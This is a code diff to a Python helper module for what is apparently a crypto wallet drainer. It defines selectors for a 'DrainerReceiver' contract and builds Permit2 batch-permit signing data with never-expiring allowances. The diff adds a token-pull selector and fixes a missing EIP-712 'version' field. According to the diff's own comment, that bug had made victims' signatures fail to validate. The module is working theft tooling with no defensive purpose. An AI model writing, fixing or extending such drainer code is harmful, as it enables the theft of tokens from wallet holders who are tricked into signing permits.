@@ -5,6 +5,7 @@ Selectors are derived from the exact Solidity signatures, so they cannot drift
 from contracts/DrainerReceiver.sol. Encoding helpers validate before emitting.
 """
 import re
+from typing import Any, Dict
 
 from eth_utils import keccak
 
@@ -50,6 +51,7 @@ SEL_AGGREGATE3    = _sel("aggregate3((address,bool,bytes)[])")
 
 # --- DrainerReceiver ------------------------------------------------------
 SEL_PULL_DIRECT   = _sel("pullDirect(address,address,uint256)")
+SEL_PULL_PERMIT2  = _sel("pullPermit2(address,address,uint160)")
 SEL_PERMIT_PULL   = _sel(
     "permitAndPull(address,((address,uint160,uint48,uint48)[],address,uint256),"
     "bytes,address[],uint160[])"
@@ -72,10 +74,14 @@ MULTICALL3 = "0xcA11bde05977b3631167028862bE2a173976CA11"
 
 # --- Permit2 EIP-712 ------------------------------------------------------
 PERMIT2_DOMAIN_NAME = "Permit2"
+PERMIT2_DOMAIN_VERSION = "1"          # EIP712("Permit2", "1") in the canonical contract
 PERMIT_DETAILS_FOREVER = UINT48_MAX
 
+# Permit2 is EIP712("Permit2", "1"). Omitting `version` changes the domain
+# separator, so the wallet's digest never matches and permit() reverts InvalidSignature.
 EIP712_DOMAIN = [
     {"name": "name", "type": "string"},
+    {"name": "version", "type": "string"},
     {"name": "chainId", "type": "uint256"},
     {"name": "verifyingContract", "type": "address"},
 ]
@@ -107,6 +113,16 @@ def encode_balance_of(addr: str) -> str:
     return SEL_BALANCE_OF + pad_address(addr)
 
 
+def permit2_domain(chain_id: int) -> Dict[str, Any]:
+    """EIP-712 domain for a PermitBatch signature. `version` is mandatory."""
+    return {
+        "name": PERMIT2_DOMAIN_NAME,
+        "version": PERMIT2_DOMAIN_VERSION,
+        "chainId": int(chain_id),
+        "verifyingContract": PERMIT2,
+    }
+
+
 def encode_allowance(owner: str, spender: str) -> str:
     return SEL_ALLOWANCE + pad_address(owner) + pad_address(spender)
 
@@ -126,5 +142,6 @@ def encode_transfer_from(src: str, dst: str, amount: int) -> str:
 
 __all__ = [n for n in dir() if n.startswith(("SEL_", "EIP712", "encode_", "require_", "is_"))
            or n in ("PERMIT2", "MULTICALL3", "TRANSFER_TOPIC", "APPROVAL_TOPIC",
-                    "PERMIT2_DOMAIN_NAME", "PERMIT_DETAILS_FOREVER", "UINT256_MAX",
-                    "UINT160_MAX", "UINT48_MAX", "pad_address")]
+                    "PERMIT2_DOMAIN_NAME", "PERMIT2_DOMAIN_VERSION",
+                    "PERMIT_DETAILS_FOREVER", "UINT256_MAX",
+                    "UINT160_MAX", "UINT48_MAX", "pad_address", "permit2_domain")]
